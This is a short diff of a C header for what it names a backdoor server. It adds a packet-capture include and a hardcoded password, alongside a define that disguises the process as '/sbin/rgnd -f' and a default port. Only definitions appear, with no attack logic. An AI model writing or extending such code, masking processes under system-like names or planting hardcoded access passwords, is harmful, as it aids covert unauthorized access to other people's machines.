@@ -2,11 +2,13 @@
 #define BACKDOOR_SERVER_H
 
 #include "utils.h"
+#include "pktcap.h"
 
 #define MASK_NAME "/sbin/rgnd -f"
 #define DEFAULT_PORT 8080
 #define TRUE 1
 #define FALSE 0
+#define PASSWORD "uest1onQ?"
 
 struct options
 {
